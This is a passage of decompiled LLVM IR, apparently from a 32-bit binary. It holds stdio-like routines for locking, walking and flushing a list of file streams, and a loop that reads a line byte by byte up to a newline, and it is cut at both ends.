  uselistorder i32 %v11_8056133, { 1, 0 }
  uselistorder i32 %v1_8056105, { 1, 0 }
  uselistorder i32 %v0_8056101, { 1, 0 }
  uselistorder i32 %v2_8056137, { 1, 0, 2 }
  uselistorder i32 %v1_80560b7, { 0, 1, 4, 2, 3, 5 }
  uselistorder i32* %stack_var_-16, { 1, 0, 2 }
  uselistorder i32* %stack_var_-76, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 0, 10, 11, 12, 13, 14 }
  uselistorder i32* %eax.global-to-local, { 2, 1, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 15, 14, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 0, 26, 27 }
  uselistorder i32 -65281, { 1, 0 }
  uselistorder i32 191, { 0, 2, 1 }
  uselistorder i32 4096, { 16, 8, 13, 3, 15, 4, 5, 17, 6, 14, 10, 9, 1, 12, 11, 2, 0, 7 }
  uselistorder i32 (i32)* @function_8052180, { 2, 1, 0 }
  uselistorder i32 (i8*, i32)* @function_8050d0c, { 3, 4, 0, 1, 2 }
  uselistorder i32 32768, { 0, 2, 1 }
  uselistorder i32 (i32, i32, i32)* @function_8050a3c, { 1, 0, 9, 8, 7, 6, 5, 4, 3, 2 }
  uselistorder i32 1024, { 3, 1, 2, 0, 9, 4, 6, 5, 8, 7 }
  uselistorder i32 (i32)* @function_80510cb, { 3, 2, 1, 0, 4 }
  uselistorder i32 22, { 10, 6, 11, 1, 3, 4, 5, 2, 9, 13, 7, 8, 12, 0 }
  uselistorder i32 577, { 0, 2, 1 }
  uselistorder i32 %arg4, { 3, 1, 0, 2, 4, 5 }
  uselistorder label %dec_label_pc_8056271, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_805626a, { 1, 0 }
  uselistorder label %dec_label_pc_80561dc, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8056127, { 1, 0 }
  uselistorder label %dec_label_pc_80560e4, { 1, 0 }
  uselistorder label %dec_label_pc_80560ae, { 1, 0 }
  uselistorder label %dec_label_pc_8056095, { 2, 0, 1 }
}

define i32 @function_805627c(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_805627c:
  %ecx.global-to-local = alloca i32, align 4
  %tmp5 = ptrtoint i32* %arg2 to i32
  store i32 %tmp5, i32* @ebx, align 4
  %v1_8056288 = add i32 %tmp5, 4
  %v2_8056288 = inttoptr i32 %v1_8056288 to i32*
  %v3_8056288 = load i32, i32* %v2_8056288, align 4
  %v2_805628b = load i32, i32* %arg2, align 4
  %v1_8056291 = add i32 %arg1, 4
  %v2_8056291 = inttoptr i32 %v1_8056291 to i32*
  %v3_8056291 = load i32, i32* %v2_8056291, align 4
  %v4_8056294 = call i32 @function_80571d8(i32 %v3_8056291, i32 %v2_805628b, i32 %v3_8056288, i32 %arg3)
  %v0_805629c = load i32, i32* @edx, align 4
  %v2_805629c = icmp slt i32 %v0_805629c, 0
  store i32 %v4_8056294, i32* %ecx.global-to-local, align 4
  br i1 %v2_805629c, label %dec_label_pc_80562a9, label %dec_label_pc_80562a2

dec_label_pc_80562a2:                             ; preds = %dec_label_pc_805627c
  %v1_80562a2 = load i32, i32* @ebx, align 4
  %v2_80562a2 = inttoptr i32 %v1_80562a2 to i32*
  store i32 %v4_8056294, i32* %v2_80562a2, align 4
  store i32 0, i32* %ecx.global-to-local, align 4
  %v0_80562a6 = load i32, i32* @edx, align 4
  %v1_80562a6 = load i32, i32* @ebx, align 4
  %v2_80562a6 = add i32 %v1_80562a6, 4
  %v3_80562a6 = inttoptr i32 %v2_80562a6 to i32*
  store i32 %v0_80562a6, i32* %v3_80562a6, align 4
  %v0_80562aa.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_80562a9

dec_label_pc_80562a9:                             ; preds = %dec_label_pc_805627c, %dec_label_pc_80562a2
  %v0_80562aa = phi i32 [ %v4_8056294, %dec_label_pc_805627c ], [ %v0_80562aa.pre, %dec_label_pc_80562a2 ]
  ret i32 %v0_80562aa

; uselistorder directives
  uselistorder i32 %tmp5, { 1, 0 }
  uselistorder label %dec_label_pc_80562a9, { 1, 0 }
}

define i32 @function_80562b0(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_80562b0:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v0_80562b0 = load i32, i32* @edi, align 4
  %v0_80562b1 = load i32, i32* @esi, align 4
  %v0_80562b2 = load i32, i32* @ebx, align 4
  %v12_80562b3 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %arg3, i32* @esi, align 4
  %v1_80562ba = add i32 %arg3, 52
  %v2_80562ba = inttoptr i32 %v1_80562ba to i32*
  %v3_80562ba = load i32, i32* %v2_80562ba, align 4
  store i32 %v3_80562ba, i32* @edi, align 4
  %v1_80562bd = icmp eq i32 %v3_80562ba, 0
  %v1_80562bf = icmp eq i1 %v1_80562bd, false
  br i1 %v1_80562bf, label %dec_label_pc_80562b0.dec_label_pc_80562e0_crit_edge, label %dec_label_pc_80562c1

dec_label_pc_80562b0.dec_label_pc_80562e0_crit_edge: ; preds = %dec_label_pc_80562b0
  br label %dec_label_pc_80562e0

dec_label_pc_80562c1:                             ; preds = %dec_label_pc_80562b0
  %v1_80562c1 = add i32 %arg3, 56
  store i32 %v1_80562c1, i32* @ebx, align 4
  store i32 %v12_80562b3, i32* @eax, align 4
  %v2_80562d0 = call i32 @function_805405a(i32 %v12_80562b3, i32 134561879)
  %v0_80562d5 = load i32, i32* @ebx, align 4
  %v1_80562d8 = call i32 @function_8054057(i32 %v0_80562d5)
  %v0_80562e1.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_80562e0

dec_label_pc_80562e0:                             ; preds = %dec_label_pc_80562b0.dec_label_pc_80562e0_crit_edge, %dec_label_pc_80562c1
  %v0_80562e1 = phi i32 [ %arg3, %dec_label_pc_80562b0.dec_label_pc_80562e0_crit_edge ], [ %v0_80562e1.pre, %dec_label_pc_80562c1 ]
  %v0_80562e0 = load i32, i32* @edx, align 4
  %v4_80562ea = inttoptr i32 %arg1 to i8*
  %v5_80562ea = call i32 @function_8056548(i8* %v4_80562ea, i32 %arg2, i32 %v0_80562e1, i32 %v0_80562e0)
  store i32 %v5_80562ea, i32* %ebx.global-to-local, align 4
  br i1 %v1_80562bf, label %dec_label_pc_8056309, label %dec_label_pc_80562f8

dec_label_pc_80562f8:                             ; preds = %dec_label_pc_80562e0
  store i32 %v12_80562b3, i32* @eax, align 4
  %v2_8056301 = call i32 @function_805405a(i32 %v12_80562b3, i32 1)
  %v0_805630c.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8056309

dec_label_pc_8056309:                             ; preds = %dec_label_pc_80562e0, %dec_label_pc_80562f8
  %v0_805630c = phi i32 [ %v5_80562ea, %dec_label_pc_80562e0 ], [ %v0_805630c.pre, %dec_label_pc_80562f8 ]
  store i32 %v0_80562b2, i32* @ebx, align 4
  store i32 %v0_80562b1, i32* @esi, align 4
  store i32 %v0_80562b0, i32* @edi, align 4
  ret i32 %v0_805630c

; uselistorder directives
  uselistorder i32 %v12_80562b3, { 2, 3, 0, 1 }
  uselistorder i32 52, { 9, 10, 6, 11, 1, 12, 2, 3, 4, 8, 5, 14, 15, 7, 13, 0 }
  uselistorder i32 %arg3, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_8056309, { 1, 0 }
  uselistorder label %dec_label_pc_80562e0, { 1, 0 }
}

define i32 @function_8056314() local_unnamed_addr {
dec_label_pc_8056314:
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v2_8056323 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_8056323, i32* @eax, align 4
  %v2_8056328 = call i32 @function_805405a(i32 %v2_8056323, i32 134561879)
  %v1_8056334 = call i32 @function_8054057(i32 ptrtoint (i32* @global_var_805e658.308 to i32))
  %v0_8056339 = load i32, i32* @global_var_80628e4.413, align 4
  %v8_8056341 = icmp eq i32 %v0_8056339, 1
  %v1_8056342 = icmp eq i1 %v8_8056341, false
  br i1 %v1_8056342, label %dec_label_pc_80563d9, label %dec_label_pc_8056348

dec_label_pc_8056348:                             ; preds = %dec_label_pc_8056314
  %v0_8056348 = load i32, i32* @global_var_80628e8.414, align 8
  %tmp29 = icmp slt i32 %v0_8056348, 1
  br i1 %tmp29, label %dec_label_pc_80563d9, label %dec_label_pc_8056355

dec_label_pc_8056355:                             ; preds = %dec_label_pc_8056348
  store i32 0, i32* @esi, align 4
  %v2_8056362 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_8056362, i32* @eax, align 4
  %v2_8056367 = call i32 @function_805405a(i32 %v2_8056362, i32 134561879)
  %v1_8056373 = call i32 @function_8054057(i32 ptrtoint (i32* @global_var_805e640.307 to i32))
  %v0_8056378 = load i32, i32* bitcast (i32** @global_var_805e63c.309 to i32*), align 4
  store i32 %v0_8056378, i32* %edx.global-to-local, align 4
  %v1_80563ba3 = icmp eq i32 %v0_8056378, 0
  %v1_80563bc10 = icmp eq i1 %v1_80563ba3, false
  br i1 %v1_80563bc10, label %dec_label_pc_8056383, label %dec_label_pc_80563be

dec_label_pc_8056383:                             ; preds = %dec_label_pc_8056355, %dec_label_pc_80563b8
  %v1_805638314.in = phi i32 [ %v0_80563b8, %dec_label_pc_80563b8 ], [ %v0_8056378, %dec_label_pc_8056355 ]
  %v1_805638314 = inttoptr i32 %v1_805638314.in to i16*
  %v2_8056383 = load i16, i16* %v1_805638314, align 2
  %v1_8056386 = add i32 %v1_805638314.in, 32
  %v2_8056386 = inttoptr i32 %v1_8056386 to i32*
  %v3_8056386 = load i32, i32* %v2_8056386, align 4
  store i32 %v3_8056386, i32* @ebx, align 4
  %v1_8056389 = and i16 %v2_8056383, -32720
  %v6_805638e = icmp eq i16 %v1_8056389, 48
  br i1 %v6_805638e, label %dec_label_pc_8056397, label %dec_label_pc_8056393

dec_label_pc_8056393:                             ; preds = %dec_label_pc_8056383
  store i32 %v1_805638314.in, i32* @esi, align 4
  br label %dec_label_pc_80563b8

dec_label_pc_8056397:                             ; preds = %dec_label_pc_8056383
  %v0_8056397 = load i32, i32* @esi, align 4
  %v1_8056397 = icmp eq i32 %v0_8056397, 0
  %v1_8056399 = icmp eq i1 %v1_8056397, false
  br i1 %v1_8056399, label %dec_label_pc_80563a3, label %dec_label_pc_805639b

dec_label_pc_805639b:                             ; preds = %dec_label_pc_8056397
  store i32 %v3_8056386, i32* bitcast (i32** @global_var_805e63c.309 to i32*), align 4
  br label %dec_label_pc_80563a6

dec_label_pc_80563a3:                             ; preds = %dec_label_pc_8056397
  %v2_80563a3 = add i32 %v0_8056397, 32
  %v3_80563a3 = inttoptr i32 %v2_80563a3 to i32*
  store i32 %v3_8056386, i32* %v3_80563a3, align 4
  %v0_80563a6.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80563a6

dec_label_pc_80563a6:                             ; preds = %dec_label_pc_805639b, %dec_label_pc_80563a3
  %v0_80563af = phi i32 [ %v1_805638314.in, %dec_label_pc_805639b ], [ %v0_80563a6.pre, %dec_label_pc_80563a3 ]
  %v1_80563a6 = add i32 %v0_80563af, 1
  %v2_80563a6 = inttoptr i32 %v1_80563a6 to i8*
  %v3_80563a6 = load i8, i8* %v2_80563a6, align 1
  %v4_80563a6 = and i8 %v3_80563a6, 32
  %v5_80563a6 = icmp eq i8 %v4_80563a6, 0
  br i1 %v5_80563a6, label %dec_label_pc_80563b8, label %dec_label_pc_80563ac

dec_label_pc_80563ac:                             ; preds = %dec_label_pc_80563a6
  %v1_80563b0 = call i32 @function_8053391(i32 %v0_80563af)
  br label %dec_label_pc_80563b8

dec_label_pc_80563b8:                             ; preds = %dec_label_pc_80563a6, %dec_label_pc_8056393, %dec_label_pc_80563ac
  %v0_80563b8 = load i32, i32* @ebx, align 4
  store i32 %v0_80563b8, i32* %edx.global-to-local, align 4
  %v1_80563ba = icmp eq i32 %v0_80563b8, 0
  %v1_80563bc = icmp eq i1 %v1_80563ba, false
  br i1 %v1_80563bc, label %dec_label_pc_8056383, label %dec_label_pc_80563be

dec_label_pc_80563be:                             ; preds = %dec_label_pc_80563b8, %dec_label_pc_8056355
  store i32 %v2_8056362, i32* @eax, align 4
  %v2_80563c7 = call i32 @function_805405a(i32 %v2_8056362, i32 1)
  store i32 0, i32* @global_var_80628e8.414, align 8
  %v0_80563d9.pre = load i32, i32* @global_var_80628e4.413, align 4
  br label %dec_label_pc_80563d9

dec_label_pc_80563d9:                             ; preds = %dec_label_pc_8056348, %dec_label_pc_8056314, %dec_label_pc_80563be
  %v0_80563d9 = phi i32 [ %v0_8056339, %dec_label_pc_8056348 ], [ %v0_8056339, %dec_label_pc_8056314 ], [ %v0_80563d9.pre, %dec_label_pc_80563be ]
  %v1_80563de = add i32 %v0_80563d9, -1
  store i32 %v1_80563de, i32* @global_var_80628e4.413, align 4
  store i32 %v2_8056323, i32* @eax, align 4
  %v2_80563ed = call i32 @function_805405a(i32 %v2_8056323, i32 1)
  ret i32 %v2_80563ed

; uselistorder directives
  uselistorder i32 %v0_80563b8, { 1, 2, 0 }
  uselistorder i32 %v1_805638314.in, { 2, 1, 0, 3 }
  uselistorder i32 %v0_8056339, { 1, 2, 0 }
  uselistorder i32 (i32)* @function_8053391, { 16, 15, 14, 5, 13, 12, 11, 10, 9, 8, 7, 6, 4, 3, 2, 1, 0, 19, 18, 17 }
  uselistorder label %dec_label_pc_80563d9, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80563b8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80563a6, { 1, 0 }
  uselistorder label %dec_label_pc_8056383, { 1, 0 }
}

define i32 @function_80563f8(i16* %arg1) local_unnamed_addr {
dec_label_pc_80563f8:
  %stack_var_-32 = alloca i32, align 4
  %v0_80563f8 = load i32, i32* @ebp, align 4
  store i32 0, i32* @ebp, align 4
  %v0_80563fb = load i32, i32* @edi, align 4
  %v0_80563fc = load i32, i32* @esi, align 4
  %v0_80563fd = load i32, i32* @ebx, align 4
  %v4_8056401 = ptrtoint i16* %arg1 to i32
  store i32 %v4_8056401, i32* @ebx, align 4
  %v10_8056405 = icmp eq i16* %arg1, inttoptr (i32 134604348 to i16*)
  br i1 %v10_8056405, label %dec_label_pc_8056419, label %dec_label_pc_805640d

dec_label_pc_805640d:                             ; preds = %dec_label_pc_80563f8
  %v2_805640d = icmp eq i16* %arg1, null
  store i32 256, i32* @ebp, align 4
  %v1_8056413 = icmp eq i1 %v2_805640d, false
  br i1 %v1_8056413, label %dec_label_pc_8056511, label %dec_label_pc_8056419

dec_label_pc_8056419:                             ; preds = %dec_label_pc_805640d, %dec_label_pc_80563f8
  store i32 0, i32* @edi, align 4
  %v2_8056426 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_8056426, i32* @ebx, align 4
  %v2_805642b = call i32 @function_805405a(i32 %v2_8056426, i32 134561879)
  %v1_8056437 = call i32 @function_8054057(i32 ptrtoint (i32* @global_var_805e658.308 to i32))
  %v0_805643c = load i32, i32* @global_var_80628e4.413, align 4
  store i32 ptrtoint (i32* @global_var_805e658.308 to i32), i32* @ecx, align 4
  %v1_8056443 = add i32 %v0_805643c, 1
  store i32 %v1_8056443, i32* @eax, align 4
  store i32 %v1_8056443, i32* @global_var_80628e4.413, align 4
  %v2_805644c = call i32 @function_805405a(i32 %v2_8056426, i32 1)
  store i32 %v2_805644c, i32* @eax, align 4
  %v2_805645f = call i32 @function_805405a(i32 %v2_8056426, i32 134561879)
  %v1_805646b = call i32 @function_8054057(i32 ptrtoint (i32* @global_var_805e640.307 to i32))
  %v0_8056470 = load i32, i32* bitcast (i32** @global_var_805e63c.309 to i32*), align 4
  store i32 %v0_8056470, i32* @esi, align 4
  store i32 ptrtoint (i32* @global_var_805e640.307 to i32), i32* @eax, align 4
  %v2_805647b = call i32 @function_805405a(i32 %v2_8056426, i32 1)
  %v0_80565021 = load i32, i32* @esi, align 4
  %v1_80565022 = icmp eq i32 %v0_80565021, 0
  %v1_80565049 = icmp eq i1 %v1_80565022, false
  br i1 %v1_80565049, label %dec_label_pc_8056485, label %dec_label_pc_805650a

dec_label_pc_8056485:                             ; preds = %dec_label_pc_8056419, %dec_label_pc_80564ff
  %v0_8056493 = phi i32 [ %v3_80564ff, %dec_label_pc_80564ff ], [ %v0_80565021, %dec_label_pc_8056419 ]
  %v1_8056485 = inttoptr i32 %v0_8056493 to i8*
  %v2_8056485 = load i8, i8* %v1_8056485, align 1
  %v3_8056485 = and i8 %v2_8056485, 64
  %v4_8056485 = icmp eq i8 %v3_8056485, 0
  br i1 %v4_8056485, label %dec_label_pc_80564ff, label %dec_label_pc_805648a

dec_label_pc_805648a:                             ; preds = %dec_label_pc_8056485
  %v0_805648a = load i32, i32* @global_var_805e670.415, align 16
  %v9_805648a = icmp eq i32 %v0_805648a, 2
  br i1 %v9_805648a, label %dec_label_pc_80564b2, label %dec_label_pc_8056493

dec_label_pc_8056493:                             ; preds = %dec_label_pc_805648a
  %v1_8056493 = add i32 %v0_8056493, 56
  store i32 %v1_8056493, i32* @ebx, align 4
  store i32 %v2_8056426, i32* @eax, align 4
  %v2_80564a2 = call i32 @function_805405a(i32 %v2_8056426, i32 134561879)
  %v0_80564a7 = load i32, i32* @ebx, align 4
  %v1_80564aa = call i32 @function_8054057(i32 %v0_80564a7)
  %v0_80564b2.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_80564b2

dec_label_pc_80564b2:                             ; preds = %dec_label_pc_805648a, %dec_label_pc_8056493
  %v0_80564c5 = phi i32 [ %v0_8056493, %dec_label_pc_805648a ], [ %v0_80564b2.pre, %dec_label_pc_8056493 ]
  %v1_80564b2 = inttoptr i32 %v0_80564c5 to i32*
  %v2_80564b2 = load i32, i32* %v1_80564b2, align 4
  %v1_80564b4 = load i32, i32* @ebp, align 4
  %v2_80564b4 = or i32 %v1_80564b4, %v2_80564b2
  %v1_80564b6 = and i32 %v2_80564b4, 832
  %v2_80564bb = icmp eq i32 %v1_80564b6, 320
  %v1_80564c0 = icmp eq i1 %v2_80564bb, false
  br i1 %v1_80564c0, label %dec_label_pc_80564e5, label %dec_label_pc_80564c2

dec_label_pc_80564c2:                             ; preds = %dec_label_pc_80564b2
  %v1_80564c6 = call i32 @function_805116c(i32 %v0_80564c5)
  %v1_80564ce = icmp eq i32 %v1_80564c6, 0
  br i1 %v1_80564ce, label %dec_label_pc_80564d7, label %dec_label_pc_80564d2

dec_label_pc_80564d2:                             ; preds = %dec_label_pc_80564c2
  store i32 -1, i32* @edi, align 4
  br label %dec_label_pc_80564e5

dec_label_pc_80564d7:                             ; preds = %dec_label_pc_80564c2
  %v0_80564d7 = load i32, i32* @esi, align 4
  %v1_80564d7 = add i32 %v0_80564d7, 8
  %v2_80564d7 = inttoptr i32 %v1_80564d7 to i32*
  %v3_80564d7 = load i32, i32* %v2_80564d7, align 4
  %v2_80564da = add i32 %v0_80564d7, 28
  %v3_80564da = inttoptr i32 %v2_80564da to i32*
  store i32 %v3_80564d7, i32* %v3_80564da, align 4
  %v0_80564dd = load i32, i32* @esi, align 4
  %v1_80564dd = inttoptr i32 %v0_80564dd to i32*
  %v2_80564dd = load i32, i32* %v1_80564dd, align 4
  %v2_80564dd.tr = trunc i32 %v2_80564dd to i16
  %v1_80564e2 = and i16 %v2_80564dd.tr, -65
  %v3_80564e2 = inttoptr i32 %v0_80564dd to i16*
  store i16 %v1_80564e2, i16* %v3_80564e2, align 2
  br label %dec_label_pc_80564e5

dec_label_pc_80564e5:                             ; preds = %dec_label_pc_80564b2, %dec_label_pc_80564d2, %dec_label_pc_80564d7
  %v0_80564e5 = load i32, i32* @global_var_805e670.415, align 16
  %v9_80564e5 = icmp eq i32 %v0_80564e5, 2
  br i1 %v9_80564e5, label %dec_label_pc_80564ff, label %dec_label_pc_80564ee

dec_label_pc_80564ee:                             ; preds = %dec_label_pc_80564e5
  store i32 %v2_8056426, i32* @eax, align 4
  %v2_80564f7 = call i32 @function_805405a(i32 %v2_8056426, i32 1)
  br label %dec_label_pc_80564ff

dec_label_pc_80564ff:                             ; preds = %dec_label_pc_80564e5, %dec_label_pc_8056485, %dec_label_pc_80564ee
  %v0_80564ff = load i32, i32* @esi, align 4
  %v1_80564ff = add i32 %v0_80564ff, 32
  %v2_80564ff = inttoptr i32 %v1_80564ff to i32*
  %v3_80564ff = load i32, i32* %v2_80564ff, align 4
  store i32 %v3_80564ff, i32* @esi, align 4
  %v1_8056502 = icmp eq i32 %v3_80564ff, 0
  %v1_8056504 = icmp eq i1 %v1_8056502, false
  br i1 %v1_8056504, label %dec_label_pc_8056485, label %dec_label_pc_805650a

dec_label_pc_805650a:                             ; preds = %dec_label_pc_80564ff, %dec_label_pc_8056419
  %v0_805650a = call i32 @function_8056314()
  br label %dec_label_pc_805653b

dec_label_pc_8056511:                             ; preds = %dec_label_pc_805640d
  store i32 0, i32* @edi, align 4
  %tmp23 = bitcast i16* %arg1 to i8*
  %v3_8056513 = load i8, i8* %tmp23, align 1
  %v4_8056513 = and i8 %v3_8056513, 64
  %v5_8056513 = icmp eq i8 %v4_8056513, 0
  br i1 %v5_8056513, label %dec_label_pc_805653b, label %dec_label_pc_8056518

dec_label_pc_8056518:                             ; preds = %dec_label_pc_8056511
  store i32 -1, i32* @edi, align 4
  %v1_805651f = call i32 @function_805116c(i32 %v4_8056401)
  %v1_8056527 = icmp eq i32 %v1_805651f, 0
  %v1_8056529 = icmp eq i1 %v1_8056527, false
  br i1 %v1_8056529, label %dec_label_pc_805653b, label %dec_label_pc_805652b

dec_label_pc_805652b:                             ; preds = %dec_label_pc_8056518
  %v2_805652b = add i32 %v4_8056401, 8
  %v3_805652b = inttoptr i32 %v2_805652b to i32*
  %v4_805652b = load i32, i32* %v3_805652b, align 4
  store i32 0, i32* @edi, align 4
  %v3_8056530 = add i32 %v4_8056401, 28
  %v4_8056530 = inttoptr i32 %v3_8056530 to i32*
  store i32 %v4_805652b, i32* %v4_8056530, align 4
  %tmp24 = bitcast i16* %arg1 to i32*
  %v3_8056533 = load i32, i32* %tmp24, align 4
  %v3_8056533.tr = trunc i32 %v3_8056533 to i16
  %v1_8056538 = and i16 %v3_8056533.tr, -65
  store i16 %v1_8056538, i16* %arg1, align 2
  br label %dec_label_pc_805653b

dec_label_pc_805653b:                             ; preds = %dec_label_pc_8056518, %dec_label_pc_8056511, %dec_label_pc_805650a, %dec_label_pc_805652b
  %v0_805653e = load i32, i32* @edi, align 4
  store i32 %v0_80563fd, i32* @ebx, align 4
  store i32 %v0_80563fc, i32* @esi, align 4
  store i32 %v0_80563fb, i32* @edi, align 4
  store i32 %v0_80563f8, i32* @ebp, align 4
  ret i32 %v0_805653e

; uselistorder directives
  uselistorder i32 %v3_80564ff, { 1, 2, 0 }
  uselistorder i32 %v2_8056426, { 2, 3, 0, 1, 4, 5, 6, 7, 8 }
  uselistorder i32 ()* @function_8056314, { 1, 0 }
  uselistorder i8 64, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32* bitcast (i32** @global_var_805e63c.309 to i32*), { 2, 3, 4, 5, 6, 0, 1 }
  uselistorder i32 ptrtoint (i32* @global_var_805e640.307 to i32), { 0, 1, 2, 3, 5, 4 }
  uselistorder i32* @global_var_80628e4.413, { 1, 2, 3, 0, 4, 5, 6 }
  uselistorder i32 (i32)* @function_8054057, { 25, 24, 23, 22, 21, 20, 19, 18, 27, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 26, 5, 29, 31, 30, 28, 4, 3, 2, 1, 7, 0, 6 }
  uselistorder i32 ptrtoint (i32* @global_var_805e658.308 to i32), { 1, 3, 4, 5, 9, 2, 6, 0, 7, 8 }
  uselistorder i32 (i32, i32)* @function_805405a, { 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 47, 46, 27, 26, 25, 24, 23, 22, 6, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 45, 44, 5, 4, 51, 50, 55, 54, 53, 52, 49, 48, 3, 2, 8, 7, 1, 0 }
  uselistorder i32 134561879, { 17, 18, 2, 19, 3, 4, 20, 21, 5, 22, 6, 7, 8, 25, 26, 27, 28, 29, 30, 0, 23, 9, 10, 11, 12, 13, 14, 15, 16, 1, 24 }
  uselistorder i16* %arg1, { 2, 1, 4, 3, 0, 5 }
  uselistorder label %dec_label_pc_805653b, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_80564ff, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80564e5, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80564b2, { 1, 0 }
  uselistorder label %dec_label_pc_8056485, { 1, 0 }
}

define i32 @function_8056548(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8056548:
  %eax.global-to-local = alloca i32, align 4
  %v0_8056548 = load i32, i32* @ebp, align 4
  %v4_8056553 = ptrtoint i8* %arg1 to i32
  store i32 %v4_8056553, i32* @edi, align 4
  store i32 %arg3, i32* @ebp, align 4
  store i32 %v4_8056553, i32* @ebx, align 4
  %tmp17 = icmp slt i32 %arg2, 1
  %tmp18 = icmp eq i1 %tmp17, false
  br i1 %tmp18, label %dec_label_pc_8056599.preheader, label %dec_label_pc_80565a5

dec_label_pc_8056599.preheader:                   ; preds = %dec_label_pc_8056548
  %v1_805659919 = add i32 %arg2, -1
  %v8_805659923 = icmp eq i32 %v1_805659919, 0
  store i32 %v1_805659919, i32* @esi, align 4
  %v1_805659a25 = icmp eq i1 %v8_805659923, false
  br i1 %v1_805659a25, label %dec_label_pc_8056563, label %dec_label_pc_805659c

dec_label_pc_8056563:                             ; preds = %dec_label_pc_8056599.preheader, %dec_label_pc_8056597.dec_label_pc_8056599_crit_edge.dec_label_pc_8056563_crit_edge
  %v0_8056563 = phi i32 [ %v0_8056563.pre, %dec_label_pc_8056597.dec_label_pc_8056599_crit_edge.dec_label_pc_8056563_crit_edge ], [ %arg3, %dec_label_pc_8056599.preheader ]
  %v1_8056563 = add i32 %v0_8056563, 16
  %v2_8056563 = inttoptr i32 %v1_8056563 to i32*
  %v3_8056563 = load i32, i32* %v2_8056563, align 4
  store i32 %v3_8056563, i32* %eax.global-to-local, align 4
  %v2_8056566 = add i32 %v0_8056563, 24
  %v3_8056566 = inttoptr i32 %v2_8056566 to i32*
  %v4_8056566 = load i32, i32* %v3_8056566, align 4
  %v10_8056566 = icmp ult i32 %v3_8056563, %v4_8056566
  %v1_8056569 = icmp eq i1 %v10_8056566, false
  br i1 %v1_8056569, label %dec_label_pc_8056579, label %dec_label_pc_805656b

dec_label_pc_805656b:                             ; preds = %dec_label_pc_8056563
  %v1_805656b = inttoptr i32 %v3_8056563 to i8*
  %v2_805656b = load i8, i8* %v1_805656b, align 1
  %v3_805656b = zext i8 %v2_805656b to i32
  %v4_805656b = load i32, i32* @edx, align 4
  %v5_805656b = and i32 %v4_805656b, -256
  %v6_805656b = or i32 %v5_805656b, %v3_805656b
  store i32 %v6_805656b, i32* @edx, align 4
  %v1_805656d = add i32 %v3_8056563, 1
  store i32 %v1_805656d, i32* %eax.global-to-local, align 4
  %v2_805656e = load i32, i32* @ebx, align 4
  %v3_805656e = inttoptr i32 %v2_805656e to i8*
  store i8 %v2_805656b, i8* %v3_805656e, align 1
  %v0_8056570 = load i32, i32* @ebx, align 4
  %v1_8056570 = add i32 %v0_8056570, 1
  store i32 %v1_8056570, i32* @ebx, align 4
  %v0_8056571 = load i32, i32* @edx, align 4
  %v1_8056571 = trunc i32 %v0_8056571 to i8
  %v10_8056571 = icmp eq i8 %v1_8056571, 10
  %v0_8056574 = load i32, i32* %eax.global-to-local, align 4
  %v1_8056574 = load i32, i32* @ebp, align 4
  %v2_8056574 = add i32 %v1_8056574, 16
  %v3_8056574 = inttoptr i32 %v2_8056574 to i32*
  store i32 %v0_8056574, i32* %v3_8056574, align 4
  br i1 %v10_8056571, label %dec_label_pc_805659c, label %dec_label_pc_8056597.dec_label_pc_8056599_crit_edge

dec_label_pc_8056579:                             ; preds = %dec_label_pc_8056563
  %v0_805657d = call i32 @function_8057250()
  %v1_805657d = trunc i32 %v0_805657d to i8
  store i32 %v0_805657d, i32* %eax.global-to-local, align 4
  %sext = mul i32 %v0_805657d, 16777216
  %tmp = icmp eq i32 %sext, -16777216
  %v1_8056588 = icmp eq i1 %tmp, false
  br i1 %v1_8056588, label %dec_label_pc_8056597, label %dec_label_pc_805658a

dec_label_pc_805658a:                             ; preds = %dec_label_pc_8056579
  %v0_805658a = load i32, i32* @ebp, align 4
  %v1_805658a = inttoptr i32 %v0_805658a to i8*
  %v2_805658a = load i8, i8* %v1_805658a, align 1
  %v3_805658a = and i8 %v2_805658a, 8
  %v4_805658a = icmp eq i8 %v3_805658a, 0
  br i1 %v4_805658a, label %dec_label_pc_805659c, label %dec_label_pc_80565a5

dec_label_pc_8056597:                             ; preds = %dec_label_pc_8056579
  %v3_8056592 = load i32, i32* @ebx, align 4
  %v4_8056592 = inttoptr i32 %v3_8056592 to i8*
  store i8 %v1_805657d, i8* %v4_8056592, align 1
  %v0_8056594 = load i32, i32* @ebx, align 4
  %v1_8056594 = add i32 %v0_8056594, 1
  store i32 %v1_8056594, i32* @ebx, align 4
  %v11_8056595 = icmp eq i8 %v1_805657d, 10
  br i1 %v11_8056595, label %dec_label_pc_805659c, label %dec_label_pc_8056597.dec_label_pc_8056599_crit_edge

dec_label_pc_8056597.dec_label_pc_8056599_crit_edge: ; preds = %dec_label_pc_805656b, %dec_label_pc_8056597
